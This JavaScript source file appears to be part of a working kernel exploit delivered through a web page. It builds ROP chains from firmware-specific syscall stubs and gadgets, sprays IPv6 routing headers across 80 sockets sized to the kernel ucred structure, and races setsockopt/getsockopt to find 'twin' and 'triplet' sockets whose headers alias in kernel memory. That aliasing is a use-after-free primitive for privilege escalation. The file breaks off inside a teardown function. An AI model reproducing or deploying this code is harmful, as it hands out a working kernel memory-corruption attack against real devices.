import {
  K,
  BANNED,
  buildRthdr,
  w32,
  r32,
  w64,
} from "./poops-common.js?v=final";

export const TWK = {
  IPV6_SOCK_NUM: 80,

  UCRED_SIZE: K.UCRED_SIZE,

  RTHDR_TAG: K.RTHDR_TAG,

  LEAK_LEN_IN: 8,

  C_ATTEMPTS: 5000,

  MAX_ROUNDS_TWIN: 10,

  MAX_ROUNDS_TRIPLET: 500,

  FIND_TRIPLET_FAST: 5000,

  REPAIR_SLEEP_MS: 10,

  REPAIR_ATTEMPTS: 12,

  REPAIR_ROUNDS_PER_TRY: 64,

  PROGRESS_EVERY: 1000,

  CHAIN_EPILOGUE_SLOTS: 64,
};

export function rthdrShape(size) {
  const len = ((size >> 3) - 1) & ~1;
  return { len, segleft: len >> 1, optlen: (len + 1) << 3, type: 0 };
}

export function makeTwinEngine(X) {
  const {
    P,
    chain,
    i64,
    sys,
    runChain,
    flushMark,
    queueEvent,
    note,
    track,
    untrack,
    state,
  } = X;

  let scanMarksQuiet = false;

  function setScanMarksQuiet(quiet) {
    const was = scanMarksQuiet;
    scanMarksQuiet = !!quiet;
    return was;
  }
  function scanMark(tag, extra) {
    if (scanMarksQuiet) queueEvent(tag, extra);
    else flushMark(tag, extra);
  }

  const N_DEFAULT = TWK.IPV6_SOCK_NUM;
  const SHAPE = rthdrShape(TWK.UCRED_SIZE);

  const SYS_SETSOCKOPT = 0x069;
  const SYS_GETSOCKOPT = 0x076;
  const SYS_SOCKET = 0x061;
  const SYS_CLOSE = 0x006;
  const SYS_SCHED_YIELD = 0x14b;
  const SYS_NANOSLEEP = 0x0f0;

  function needStub(num, why) {
    if (P.syscalls[num] === undefined)
      throw new Error(
        "syscall 0x" +
          num.toString(16).toUpperCase() +
          " has no stub in the active firmware profile: " +
          why +
          ".",
      );
    return P.syscalls[num];
  }
  function needGadget(name, why) {
    const g = P.gadgets[name];
    if (g === undefined)
      throw new Error(
        "gadget '" + name + "' missing from the active firmware map: " + why,
      );
    return g;
  }

  function arena(nbytes, label) {
    const raw = P.malloc(nbytes, 1);
    const base = i64(raw.low, raw.hi);
    const u8 = raw.backing;
    for (let k = 0; k < nbytes; ++k) u8[k] = 0;
    state.heapBytes += 1000 + nbytes;

    flushMark(
      "ARENA",
      label +
        "-base=0x" +
        base.toString() +
        "-bytes=" +
        nbytes +
        "-end=0x" +
        base.add32(nbytes).toString(),
    );
    return { base, u8, bytes: nbytes, label };
  }

  const S = {
    fds: [],
    n: 0,
    spray: null,
    pad: null,
    padBatch: 0,
    sprayLen: 0,
    twins: [-1, -1],
    triplets: [-1, -1, -1],
    attemptsRun: 0,
    chainRuns: 0,

    sprayCalls: 0,

    emittedCalls: 0,
    firstSprayDone: false,

    corrupt: "",

    burned: [],

    dupCount: 0,
  };

  function poison(reason) {
    if (S.corrupt) return S.corrupt;
    S.corrupt = String(reason)
      .replace(/[\r\n\t]+/g, " ")
      .slice(0, 400);
    flushMark("ENGINE-POISONED", S.corrupt.slice(0, 150));
    return S.corrupt;
  }

  function burn(idx, why) {
    if (S.burned.indexOf(idx) >= 0) return false;
    S.burned.push(idx);
    flushMark(
      "BANK-BURNED",
      "idx=" +
        idx +
        "-fd=" +
        S.fds[idx] +
        "-burned=" +
        S.burned.length +
        "-of-" +
        S.n +
        "-why=" +
        String(why).slice(0, 120),
    );
    return true;
  }
  const isBurned = (idx) => S.burned.indexOf(idx) >= 0;

  function clearCorrupt(why) {
    if (!S.corrupt) return "";
    const was = S.corrupt;
    S.corrupt = "";
    flushMark(
      "ENGINE-UNPOISONED",
      String(why).slice(0, 200) + " -- was: " + was.slice(0, 120),
    );
    return was;
  }

  const canonicalTag = (i) => (TWK.RTHDR_TAG | i) >>> 0;

  function isForged(i) {
    return !!S.spray && i >= 0 && i < S.n && sprayTagOf(i) !== canonicalTag(i);
  }

  function bankForgeries() {
    const out = [];
    if (!S.spray) return out;
    for (let i = 0; i < S.n; ++i)
      if (sprayTagOf(i) !== canonicalTag(i))
        out.push(i + "=>" + (sprayTagOf(i) & 0xffff));
    return out;
  }

  function buildSprayBank(n) {
    const stride = TWK.UCRED_SIZE;
    const a = arena(n * stride, "spray-bank-" + n + "x" + stride);
    let len = 0;
    for (let i = 0; i < n; ++i) {
      const off = i * stride;
      len = buildRthdr(a.u8, off, TWK.UCRED_SIZE);
      w32(a.u8, off + 0x04, (TWK.RTHDR_TAG | i) >>> 0);
    }
    S.spray = a;
    S.sprayLen = len;
    return { arena: a, stride, len, shape: SHAPE };
  }

  function setSprayTag(i, tagIndex) {
    w32(
      S.spray.u8,
      i * TWK.UCRED_SIZE + 0x04,
      (TWK.RTHDR_TAG | tagIndex) >>> 0,
    );
  }
  function sprayPtr(i) {
    return S.spray.base.add32(i * TWK.UCRED_SIZE);
  }
  function sprayTagOf(i) {
    return r32(S.spray.u8, i * TWK.UCRED_SIZE + 0x04) >>> 0;
  }

  const PAD_SENTINEL = 0xee;

  function allocPad(batch, n) {
    const cells = batch * n;
    const off = {
      retSet: 0,
      retGet: cells * 4,
      optlen: cells * 8,
      leak: cells * 12,
    };
    const total = cells * 12 + cells * 8;
    const a = arena(total, "pad-" + batch + "x" + n);
    S.pad = { a, off, cells, batch, n };
    S.padBatch = batch;
    return S.pad;
  }

  const padIdx = (a, i) => a * S.pad.n + i;
  const optlenPtr = (a, i) =>
    S.pad.a.base.add32(S.pad.off.optlen + padIdx(a, i) * 4);
  const leakPtr = (a, i) =>
    S.pad.a.base.add32(S.pad.off.leak + padIdx(a, i) * 8);
  const retSetPtr = (a, i) =>
    S.pad.a.base.add32(S.pad.off.retSet + padIdx(a, i) * 4);
  const retGetPtr = (a, i) =>
    S.pad.a.base.add32(S.pad.off.retGet + padIdx(a, i) * 4);

  const retSetOf = (a, i) =>
    r32(S.pad.a.u8, S.pad.off.retSet + padIdx(a, i) * 4) | 0;
  const retGetOf = (a, i) =>
    r32(S.pad.a.u8, S.pad.off.retGet + padIdx(a, i) * 4) | 0;
  const optlenOf = (a, i) =>
    r32(S.pad.a.u8, S.pad.off.optlen + padIdx(a, i) * 4) >>> 0;
  const leakTagOf = (a, i) =>
    r32(S.pad.a.u8, S.pad.off.leak + padIdx(a, i) * 8 + 4) >>> 0;
  const leakWord0Of = (a, i) =>
    r32(S.pad.a.u8, S.pad.off.leak + padIdx(a, i) * 8) >>> 0;

  function armPad(batch, n) {
    const u8 = S.pad.a.u8,
      o = S.pad.off;
    for (let a = 0; a < batch; ++a) {
      for (let i = 0; i < n; ++i) {
        const k = a * S.pad.n + i;
        w32(u8, o.optlen + k * 4, TWK.LEAK_LEN_IN);

        for (let b = 0; b < 8; ++b) u8[o.leak + k * 8 + b] = PAD_SENTINEL;
        w32(u8, o.retSet + k * 4, 0x7fffffff);
        w32(u8, o.retGet + k * 4, 0x7fffffff);
      }
    }
  }

  function chainCapacity() {
    const usable = (chain.stack_size - chain.reserved_stack) / 8;
    return Math.floor(usable) - TWK.CHAIN_EPILOGUE_SLOTS;
  }

  function measureShape(n) {
    if (!S.spray) throw new Error("measureShape: spray bank not built");
    armPadIfNeeded(1, n);
    const before = chain.count;
    emitAttempt(0, n, { readbackOnly: false, sharedOptlen: false });
    const perAttempt = chain.count - before;
    chain.clear();
    const cap = chainCapacity();
    const m = {
      perAttempt,
      perCall: perAttempt / (2 * n),
      capacity: cap,
      stackSize: chain.stack_size,
      reserved: chain.reserved_stack,
      maxBatch: Math.max(1, Math.floor(cap / perAttempt)),
      afterClear: chain.count,
      calls: 2 * n,
    };
    S.lastShape = m;
    return m;
  }

  function emitCall(num, retPtr, a1, a2, a3, a4, a5) {
    if (Object.prototype.hasOwnProperty.call(BANNED, num))
      throw new Error(
        "emitCall: syscall 0x" +
          num.toString(16).toUpperCase() +
          " is banned: " +
          BANNED[num],
      );
    const stub = P.syscalls[num];
    if (stub === undefined)
      throw new Error(
        "emitCall: syscall 0x" +
          num.toString(16).toUpperCase() +
          " has no stub in the active firmware profile",
      );
    chain.fcall(stub, a1, a2, a3, a4, a5);
    chain.write_result4(retPtr);
    S.emittedCalls++;
  }

  function emitAttempt(a, n, opts) {
    const readbackOnly = !!(opts && opts.readbackOnly);
    const sharedOptlen = !!(opts && opts.sharedOptlen);
    const skip = (opts && opts.skip) || null;
    const readOnly = opts && opts.readOnly;

    if (!readbackOnly) {
      for (let i = 0; i < n; ++i) {
        if (skip && skip.indexOf(i) >= 0) continue;

        if (S.burned.length && isBurned(i)) continue;
        emitCall(
          SYS_SETSOCKOPT,
          retSetPtr(a, i),
          S.fds[i],
          K.IPPROTO_IPV6,
          K.IPV6_RTHDR,
          sprayPtr(i),
          S.sprayLen,
        );
      }
    }
    if (readOnly !== undefined && readOnly !== null) {
      const i = readOnly;
      emitCall(
        SYS_GETSOCKOPT,
        retGetPtr(a, i),
        S.fds[i],
        K.IPPROTO_IPV6,
        K.IPV6_RTHDR,
        leakPtr(a, i),
        sharedOptlen ? optlenPtr(a, 0) : optlenPtr(a, i),
      );
      return;
    }
    for (let i = 0; i < n; ++i) {
      emitCall(
        SYS_GETSOCKOPT,
        retGetPtr(a, i),
        S.fds[i],
        K.IPPROTO_IPV6,
        K.IPV6_RTHDR,
        leakPtr(a, i),

        sharedOptlen ? optlenPtr(a, 0) : optlenPtr(a, i),
      );
    }
  }

  function isTwin(i, j, val, n) {
    return (
      (val & 0xffff0000) >>> 0 === TWK.RTHDR_TAG && i !== j && j >= 0 && j < n
    );
  }

  function scanBatch(batch, n, attemptBase) {
    const census = {
      spraysFailed: [],
      readsFailed: [],
      optlenWrong: [],
      untouched: [],
      tagAbsent: [],
      outOfRange: [],
      selfTagged: 0,
      examined: 0,
      sprayFailCount: 0,
      readFailCount: 0,
      untouchedCount: 0,
      tagAbsentCount: 0,
      optlenWrongCount: 0,
      outOfRangeCount: 0,
    };
    let hit = null;
    for (let a = 0; a < batch; ++a) {
      for (let i = 0; i < n; ++i) {
        const rs = retSetOf(a, i);
        if (rs !== 0) {
          census.sprayFailCount++;
          if (census.spraysFailed.length < 12)
            census.spraysFailed.push(
              "a" + (attemptBase + a) + ".s" + i + "=" + rs,
            );
        }
      }
      for (let i = 0; i < n; ++i) {
        census.examined++;
        const rg = retGetOf(a, i);
        if (rg !== 0) {
          census.readFailCount++;
          if (census.readsFailed.length < 12)
            census.readsFailed.push(
              "a" + (attemptBase + a) + ".s" + i + "=" + rg,
            );
          continue;
        }
        const ol = optlenOf(a, i);
        if (ol !== TWK.LEAK_LEN_IN) {
          census.optlenWrongCount++;
          if (census.optlenWrong.length < 12)
            census.optlenWrong.push(
              "a" + (attemptBase + a) + ".s" + i + "=" + ol,
            );
        }
        const w0 = leakWord0Of(a, i);
        const val = leakTagOf(a, i);
        if (w0 === 0xeeeeeeee && val === 0xeeeeeeee) {
          census.untouchedCount++;
          if (census.untouched.length < 12)
            census.untouched.push("a" + (attemptBase + a) + ".s" + i);
          continue;
        }
        if ((val & 0xffff0000) >>> 0 !== TWK.RTHDR_TAG) {
          census.tagAbsentCount++;
          if (census.tagAbsent.length < 12)
            census.tagAbsent.push(
              "a" + (attemptBase + a) + ".s" + i + "=0x" + val.toString(16),
            );
          continue;
        }
        const j = val & 0xffff;
        if (j === i) {
          census.selfTagged++;
          continue;
        }

        if (j < 0 || j >= n) {
          census.outOfRangeCount++;
          if (census.outOfRange.length < 12)
            census.outOfRange.push(
              "a" + (attemptBase + a) + ".s" + i + "=j" + j,
            );
          continue;
        }
        if (hit === null) {
          if (!isTwin(i, j, val, n))
            throw new Error(
              "scanBatch: guards admitted " +
                "(i=" +
                i +
                ", j=" +
                j +
                ", val=0x" +
                val.toString(16) +
                ") but isTwin() rejects it",
            );
          hit = {
            i,
            j,
            val,
            attempt: attemptBase + a,
            localAttempt: a,

            jGreaterThanI: j > i,

            forged: isForged(i),
          };
        }
      }
      if (hit !== null) break;
    }
    return { hit, census };
  }

  function newTotals() {
    return {
      spraysFailed: [],
      readsFailed: [],
      optlenWrong: [],
      untouched: [],
      tagAbsent: [],
      outOfRange: [],
      selfTagged: 0,
      examined: 0,
      sprayFailCount: 0,
      readFailCount: 0,
      untouchedCount: 0,
      tagAbsentCount: 0,
      optlenWrongCount: 0,
      outOfRangeCount: 0,
      batches: 0,

      firstSprayFailAt: -1,
      firstReadFailAt: -1,
    };
  }
  const EXEMPLAR_CAP = 12;
  function mergeExemplars(dst, src) {
    for (const v of src) {
      if (dst.length >= EXEMPLAR_CAP) break;
      dst.push(v);
    }
  }
  function accumulate(total, c, attemptBase) {
    total.batches++;
    total.selfTagged += c.selfTagged;
    total.examined += c.examined;
    total.sprayFailCount += c.sprayFailCount;
    total.readFailCount += c.readFailCount;
    total.untouchedCount += c.untouchedCount;
    total.tagAbsentCount += c.tagAbsentCount;
    total.optlenWrongCount += c.optlenWrongCount;
    total.outOfRangeCount += c.outOfRangeCount;
    mergeExemplars(total.spraysFailed, c.spraysFailed);
    mergeExemplars(total.readsFailed, c.readsFailed);
    mergeExemplars(total.optlenWrong, c.optlenWrong);
    mergeExemplars(total.untouched, c.untouched);
    mergeExemplars(total.tagAbsent, c.tagAbsent);
    mergeExemplars(total.outOfRange, c.outOfRange);
    if (c.sprayFailCount && total.firstSprayFailAt < 0) {
      total.firstSprayFailAt = attemptBase;

      flushMark(
        "TWIN-SPRAY-DEGRADED",
        "firstBadAttempt=" +
          attemptBase +
          "-failedInBatch=" +
          c.sprayFailCount +
          "-sample=" +
          (c.spraysFailed[0] || "?"),
      );
    }
    if (c.readFailCount && total.firstReadFailAt < 0)
      total.firstReadFailAt = attemptBase;
    return total;
  }

  async function runTwinBatch(batch, n, attemptBase, opts) {
    if (chain.count !== chain.initial_count + 3)
      throw new Error(
        "chain not fresh (count=" +
          chain.count +
          ", expected " +
          (chain.initial_count + 3) +
          ")",
      );

    const cap = chainCapacity();

    armPadIfNeeded(batch, n);
    let slots = 0;
    try {
      for (let a = 0; a < batch; ++a) {
        if (S.lastShape && chain.count + S.lastShape.perAttempt > cap)
          throw new Error(
            "chain would overflow the " +
              "usable stack at attempt " +
              a +
              " of " +
              batch +
              " (slot " +
              chain.count +
              " + " +
              S.lastShape.perAttempt +
              " > cap " +
              cap +
              ")",
          );
        emitAttempt(a, n, opts);
        if (chain.count > cap)
          throw new Error(
            "chain overflowed the usable " +
              "stack at attempt " +
              a +
              " of " +
              batch +
              " (slot " +
              chain.count +
              " > cap " +
              cap +
              ")",
          );
      }
      slots = chain.count;
    } catch (err) {
      chain.clear();
      throw err;
    }
    const t0 = Date.now();
    await runChain();
    const ms = Date.now() - t0;
    S.chainRuns++;
    S.attemptsRun += batch;
    S.sprayCalls += batch * n;
    return { slots, ms, scan: scanBatch(batch, n, attemptBase) };
  }

  async function findTwins(cfg) {
    const o = cfg || {};
    const n = S.n;
    const attempts = o.attempts || TWK.C_ATTEMPTS;
    const deadlineMs = o.deadlineMs || 0;
    let batch = o.batch || 1;
    if (batch > 1 && !o.allowBatch)
      throw new Error(
        "find_twins refuses batch=" +
          batch +
          " without an explicit allowBatch reason",
      );
    const cap = chainCapacity();
    const perAttempt = S.lastShape ? S.lastShape.perAttempt : 0;
    if (perAttempt && batch * perAttempt > cap)
      throw new Error(
        "batch " +
          batch +
          " x " +
          perAttempt +
          " slots exceeds the usable chain region (" +
          cap +
          ")",
      );

    const t0 = Date.now();
    let done = 0,
      worstMs = 0,
      totalMs = 0;
    const first = { spraySample: null, getSample: null, optlenSample: null };
    let lastCensus = null;
    const total = newTotals();
    let nextProgress = TWK.PROGRESS_EVERY;

    while (done < attempts) {
      if (deadlineMs && Date.now() - t0 > deadlineMs) {
        flushMark(
          "TWIN-DEADLINE",
          "attempts=" +
            done +
            "-of-" +
            attempts +
            "-ms=" +
            (Date.now() - t0) +
            "-totSprayFail=" +
            total.sprayFailCount +
            "-totReadFail=" +
            total.readFailCount +
            "-totSelf=" +
            total.selfTagged +
            "of" +
            total.examined,
        );
        return {
          found: false,
          reason: "deadline",
          attempts: done,
          ms: Date.now() - t0,
          worstMs,
          census: lastCensus,
          total,
          first,
        };
      }
      const b = Math.min(batch, attempts - done);
      const r = await runTwinBatch(b, n, done, o.emit || null);
      totalMs += r.ms;
      if (r.ms > worstMs) worstMs = r.ms;
      lastCensus = r.scan.census;
      accumulate(total, r.scan.census, done);

      if (!S.firstSprayDone) {
        S.firstSprayDone = true;
        first.spraySample = retSetOf(0, 0);
        first.getSample = retGetOf(0, 0);
        first.optlenSample = optlenOf(0, 0);

        scanMark(
          "TWIN-FIRST-CALLS",
          "set_rthdr[0]=" +
            first.spraySample +
            "-get_rthdr[0]=" +
            first.getSample +
            "-optlen[0]=" +
            first.optlenSample +
            "-tag[0]=0x" +
            leakTagOf(0, 0).toString(16) +
            "-sprayLen=" +
            S.sprayLen,
        );
      }

      if (r.scan.hit) {
        const h = r.scan.hit;
        S.twins[0] = h.i;
        S.twins[1] = h.j;

        if (!h.forged)
          poison(
            "sockets " +
              h.i +
              " and " +
              h.j +
              " alias in " +
              "kernel (val=0x" +
              h.val.toString(16) +
              " at attempt " +
              h.attempt +
              "), canonical spray bank",
          );
        flushMark(
          "TWIN-FOUND",
          "attempt=" +
            h.attempt +
            "-i=" +
            h.i +
            "-fdI=" +
            S.fds[h.i] +
            "-j=" +
            h.j +
            "-fdJ=" +
            S.fds[h.j] +
            "-val=0x" +
            h.val.toString(16) +
            "-jGTi=" +
            h.jGreaterThanI +
            "-forgedByThisPage=" +
            h.forged +
            "-localAttempt=" +
            h.localAttempt +
            "-ofBatch=" +
            b +
            "-ms=" +
            (Date.now() - t0),
        );

        return {
          found: true,
          i: h.i,
          j: h.j,
          val: h.val,
          hit: h,
          batch: b,
          attempts: h.attempt + 1,
          ms: Date.now() - t0,
          worstMs,
          census: r.scan.census,
          total,
          first,
        };
      }

      done += b;

      queueEvent(
        "TWIN-ATTEMPT",
        "n=" +
          done +
          "-ms=" +
          r.ms +
          "-slots=" +
          r.slots +
          "-self=" +
          r.scan.census.selfTagged +
          "-untouched=" +
          r.scan.census.untouchedCount,
      );
      if (o.onProgress) o.onProgress(done, attempts, Date.now() - t0);

      if (done >= nextProgress) {
        nextProgress = done + TWK.PROGRESS_EVERY;
        flushMark(
          "TWIN-PROGRESS",
          "attempts=" +
            done +
            "-of-" +
            attempts +
            "-ms=" +
            (Date.now() - t0) +
            "-perAttemptMs=" +
            (totalMs / Math.max(1, done)).toFixed(2) +
            "-totSprayFail=" +
            total.sprayFailCount +
            "-totReadFail=" +
            total.readFailCount +
            "-totSelf=" +
            total.selfTagged +
            "of" +
            total.examined +
            "-firstSprayFailAt=" +
            total.firstSprayFailAt,
        );
      }
    }

    scanMark(
      "TWIN-GIVEUP",
      "attempts=" +
        done +
        "-ms=" +
        (Date.now() - t0) +
        "-totSprayFail=" +
        total.sprayFailCount +
        "-totReadFail=" +
        total.readFailCount +
        "-totSelf=" +
        total.selfTagged +
        "of" +
        total.examined,
    );
    return {
      found: false,
      reason: "budget",
      attempts: done,
      ms: Date.now() - t0,
      worstMs,
      census: lastCensus,
      total,
      first,
    };
  }

  async function findTriplet(master, other, cfg) {
    const o = cfg || {};
    const n = S.n;

    const attempts = o.attempts || TWK.MAX_ROUNDS_TRIPLET;

    const deadlineMs = o.deadlineMs || 0;
    const deadlineAt =
      o.deadlineAt || (deadlineMs ? Date.now() + deadlineMs : 0);
    if (master < 0 || master >= n)
      throw new Error("find_triplet: master " + master + " is out of range");
    const skip = other >= 0 && other < n ? [master, other] : [master];
    const t0 = Date.now();
    let done = 0,
      lastVal = 0,
      lastRet = 0,
      lastOptlen = 0;
    let nextProgress = TWK.PROGRESS_EVERY;

    while (done < attempts) {
      if (deadlineAt && Date.now() > deadlineAt) {
        flushMark(
          "TRIPLET-DEADLINE",
          "master=" +
            master +
            "-other=" +
            other +
            "-attempts=" +
            done +
            "-lastRet=" +
            lastRet +
            "-lastVal=0x" +
            lastVal.toString(16),
        );
        return {
          j: -1,
          reason: "deadline",
          why: whyNoTriplet(master, other, n, lastRet, lastVal),
          attempts: done,
          ms: Date.now() - t0,
          lastVal,
          lastRet,
          lastOptlen,
        };
      }
      if (chain.count !== chain.initial_count + 3)
        throw new Error(
          "find_triplet: chain is not fresh (count=" + chain.count + ")",
        );
      armPadIfNeeded(1, n);
      try {
        emitAttempt(0, n, { skip, readOnly: master });
        if (chain.count > chainCapacity())
          throw new Error(
            "find_triplet: chain overflow at slot " + chain.count,
          );
      } catch (err) {
        chain.clear();
        throw err;
      }
      await runChain();
      S.chainRuns++;
      done++;

      lastRet = retGetOf(0, master);
      lastOptlen = optlenOf(0, master);
      lastVal = leakTagOf(0, master);
      const j = lastVal & 0xffff;

      if (
        lastRet === 0 &&
        (lastVal & 0xffff0000) >>> 0 === TWK.RTHDR_TAG &&
        j !== master &&
        j !== other &&
        j >= 0 &&
        j < n
      ) {
        const forged = isForged(master);

        if (!forged)
          poison(
            "socket " +
              master +
              " reads back socket " +
              j +
              "'s tag (val=0x" +
              lastVal.toString(16) +
              "), " +
              "canonical spray bank: master and " +
              j +
              " share one rthdr",
          );
        flushMark(
          "TRIPLET-FOUND",
          "master=" +
            master +
            "-other=" +
            other +
            "-j=" +
            j +
            "-fd=" +
            S.fds[j] +
            "-val=0x" +
            lastVal.toString(16) +
            "-attempts=" +
            done +
            "-forgedByThisPage=" +
            forged,
        );
        return {
          j,
          forged,
          attempts: done,
          ms: Date.now() - t0,
          lastVal,
          lastRet,
          lastOptlen,
        };
      }
      if (done % 100 === 0)
        queueEvent(
          "TRIPLET-ATTEMPT",
          "master=" +
            master +
            "-n=" +
            done +
            "-val=0x" +
            lastVal.toString(16) +
            "-word0=0x" +
            leakWord0Of(0, master).toString(16) +
            "-optlen=" +
            lastOptlen,
        );

      if (done >= nextProgress) {
        nextProgress = done + TWK.PROGRESS_EVERY;
        flushMark(
          "TRIPLET-PROGRESS",
          "master=" +
            master +
            "-attempts=" +
            done +
            "-of-" +
            attempts +
            "-ms=" +
            (Date.now() - t0) +
            "-lastRet=" +
            lastRet +
            "-lastVal=0x" +
            lastVal.toString(16),
        );
      }
    }
    flushMark(
      "TRIPLET-GIVEUP",
      "master=" +
        master +
        "-other=" +
        other +
        "-attempts=" +
        done +
        "-lastRet=" +
        lastRet +
        "-lastVal=0x" +
        lastVal.toString(16) +
        "-word0=0x" +
        leakWord0Of(0, master).toString(16) +
        "-optlen=" +
        lastOptlen,
    );
    return {
      j: -1,
      reason: "budget",
      why: whyNoTriplet(master, other, n, lastRet, lastVal),
      attempts: done,
      ms: Date.now() - t0,
      lastVal,
      lastRet,
      lastOptlen,
    };
  }

  function whyNoTriplet(master, other, n, lastRet, lastVal) {
    if (lastRet !== 0) return "read-failed";
    if (lastVal === 0xeeeeeeee) return "master-untouched";
    if ((lastVal & 0xffff0000) >>> 0 !== TWK.RTHDR_TAG) return "tag-absent";
    const j = lastVal & 0xffff;
    if (j === master) return "excluded-self";
    if (j === other) return "excluded-other";
    if (j < 0 || j >= n) return "out-of-range";
    return "unknown";
  }

  function tripletsValid() {
    const t = S.triplets,
      n = S.n;
    return (
      t[0] >= 0 &&
      t[1] >= 0 &&
      t[2] >= 0 &&
      t[0] < n &&
      t[1] < n &&
      t[2] < n &&
      t[0] !== t[1] &&
      t[0] !== t[2] &&
      t[1] !== t[2]
    );
  }

  async function repairTriplets(cfg) {
    const o = cfg || {};
    const n = S.n;
    const log = [];

    const attempts = o.attempts || TWK.REPAIR_ROUNDS_PER_TRY;
    const tries = o.tries || TWK.REPAIR_ATTEMPTS;

    const deadlineAt =
      o.deadlineAt || (o.deadlineMs ? Date.now() + o.deadlineMs : 0);
    const budget = { attempts, deadlineAt };
    let last = null;

    for (const slot of [1, 2]) {
      const t = S.triplets;
      if (t[slot] >= 0 && t[slot] < n) continue;
      const other = t[slot === 1 ? 2 : 1];
      let got = -1;
      for (let k = 0; k < tries; ++k) {
        flushMark(
          "TRIPLET-REPAIR",
          "slot=" +
            slot +
            "-try=" +
            (k + 1) +
            "-of-" +
            tries +
            "-master=" +
            t[0] +
            "-other=" +
            other,
        );
        const r = await findTriplet(t[0], other, budget);
        last = r;
        if (r.j >= 0) {
          got = r.j;
          log.push(
            "slot" +
              slot +
              " found " +
              got +
              " on try " +
              (k + 1) +
              " after " +
              r.attempts +
              " attempts",
          );
          break;
        }
        log.push(
          "slot" +
            slot +
            " try " +
            (k + 1) +
            " failed (" +
            (r.reason || "?") +
            "/" +
            (r.why || "?") +
            ", " +
            r.attempts +
            " attempts)",
        );

        await sysYield();
        await sysSleepMs(TWK.REPAIR_SLEEP_MS);
      }
      S.triplets[slot] = got;
      if (got < 0) {
        flushMark(
          "TRIPLET-REPAIR-FAILED",
          "slot=" +
            slot +
            "-tries=" +
            tries +
            "-why=" +
            ((last && last.why) || "?"),
        );

        return {
          ok: false,
          log,
          last,
          why: (last && last.why) || "",
          failedSlot: slot,
          triplets: S.triplets.slice(),
        };
      }
    }
    return {
      ok: tripletsValid(),
      log,
      last,
      why: (last && last.why) || "",
      failedSlot: -1,
      triplets: S.triplets.slice(),
    };
  }

  async function sysYield() {
    try {
      await sys(SYS_SCHED_YIELD);
    } catch (e) {}
  }

  let tsBuf = null;
  async function sysSleepMs(ms) {
    if (P.syscalls[SYS_NANOSLEEP] === undefined) {
      await new Promise((r) => setTimeout(r, ms));
      return "js-timer";
    }
    if (!tsBuf) tsBuf = arena(0x20, "timespec");
    w64(tsBuf.u8, 0, Math.floor(ms / 1000));
    w64(tsBuf.u8, 8, (ms % 1000) * 1000000);
    try {
      await sys(SYS_NANOSLEEP, tsBuf.base, 0);
      return "nanosleep";
    } catch (e) {
      return "threw";
    }
  }

  async function readFullHeader(idx) {
    needStub(SYS_GETSOCKOPT, "full-header read");
    const fd = S.fds[idx];
    if (fd === undefined)
      return { failed: true, errText: "no socket at index " + idx };

    const buf = arena(TWK.UCRED_SIZE, "fullhdr-buf");
    const lenp = arena(8, "fullhdr-optlen");
    for (let k = 0; k < TWK.UCRED_SIZE; ++k) buf.u8[k] = 0xee;
    w32(lenp.u8, 0, TWK.UCRED_SIZE);
    flushMark(
      "FULLHDR-PRE",
      "idx=" +
        idx +
        "-fd=" +
        fd +
        "-buf=0x" +
        buf.base.toString() +
        "-optlen-in=" +
        TWK.UCRED_SIZE +
        "-next=getsockopt",
    );
    const r = await sys(
      SYS_GETSOCKOPT,
      fd,
      K.IPPROTO_IPV6,
      K.IPV6_RTHDR,
      buf.base,
      lenp.base,
    );
    if (r.failed) return { failed: true, errText: r.errText, r: r };
    const outLen = r32(lenp.u8, 0) >>> 0;
    const tag = r32(buf.u8, 4) >>> 0;
    const want = (TWK.RTHDR_TAG | idx) >>> 0;
    flushMark(
      "FULLHDR",
      "idx=" +
        idx +
        "-ret=" +
        r.s32 +
        "-optlen-out=" +
        outLen +
        "-tag=0x" +
        tag.toString(16) +
        "-want=0x" +
        want.toString(16),
    );
    return {
      failed: false,
      outLen: outLen,
      tag: tag,
      tagOk: tag === want,
      r: r,
    };
  }

  async function openSockets(n) {
    needStub(SYS_SOCKET, "AF_INET6 spray");
    needStub(SYS_CLOSE, "socket close");
    needStub(SYS_SETSOCKOPT, "set_rthdr/free_rthdr");
    needStub(SYS_GETSOCKOPT, "get_rthdr");
    needGadget("pop rdi", "write_result4");
    needGadget("mov [rdi], eax", "write_result4");
    needGadget("ret", "fcall alignment slot");

    flushMark(
      "SOCKETS-PRE",
      "want=" + n + "-af=" + K.AF_INET6 + "-type=" + K.SOCK_STREAM,
    );

    const fds = (S.fds = []);
    S.n = 0;
    let stoppedAt = "",
      firstErr = "";
    for (let i = 0; i < n; ++i) {
      const r = await sys(SYS_SOCKET, K.AF_INET6, K.SOCK_STREAM, 0);
      if (r.failed) {
        stoppedAt = "socket " + i + " failed (" + r.errText + ")";
        firstErr = r.errText;
        break;
      }
      const fd = r.s32;
      if (fd < 0 || fd > 0x10000) {
        stoppedAt = "socket " + i + " implausible fd " + fd;
        break;
      }
      fds.push(fd);
      S.n = fds.length;
      track(fd);
    }

    const initFailed = [];
    if (fds.length) {
      armPadIfNeeded(1, fds.length);
      try {
        for (let i = 0; i < fds.length; ++i)
          emitCall(
            SYS_SETSOCKOPT,
            retSetPtr(0, i),
            fds[i],
            K.IPPROTO_IPV6,
            K.IPV6_RTHDR,
            0,
            0,
          );
      } catch (err) {
        chain.clear();
        throw err;
      }
      await runChain();
      S.chainRuns++;
      for (let i = 0; i < fds.length; ++i)
        if (retSetOf(0, i) !== 0 && initFailed.length < 24)
          initFailed.push(i + "=" + retSetOf(0, i));
    }

    const dupCount = fds.length - new Set(fds).size;
    if (dupCount)
      flushMark(
        "SOCKETS-DUPLICATE",
        "dups=" + dupCount + "-of-" + fds.length + "-bank-unusable",
      );
    S.dupCount = dupCount;
    flushMark(
      "SOCKETS",
      "opened=" +
        fds.length +
        "-of-" +
        n +
        "-first=" +
        (fds[0] === undefined ? -1 : fds[0]) +
        "-last=" +
        (fds.length ? fds[fds.length - 1] : -1) +
        "-dups=" +
        dupCount +
        "-initFreeFail=" +
        (initFailed.length || 0) +
        (initFailed.length ? "-sample=" + initFailed[0] : "") +
        (stoppedAt ? "-stopped=" + stoppedAt.replace(/[^\w.=-]+/g, "_") : ""),
    );
    return {
      fds: fds.slice(),
      opened: fds.length,
      stoppedAt,
      firstErr,
      initFailed,
    };
  }

  function armPadIfNeeded(batch, n) {
    if (!S.pad || S.pad.n !== n || S.pad.batch < batch) allocPad(batch, n);
    armPad(batch, n);
  }

  let teardownRun = null;
  let teardownResult = null;
  async function teardown(opts) {
    if (teardownResult) {
      flushMark(
        "TEARDOWN-REENTRY",
        "already-completed-freed=" +
          teardownResult.freed +
          "-closed=" +
          teardownResult.closed,
      );
      return Object.assign({}, teardownResult, { reentry: true });
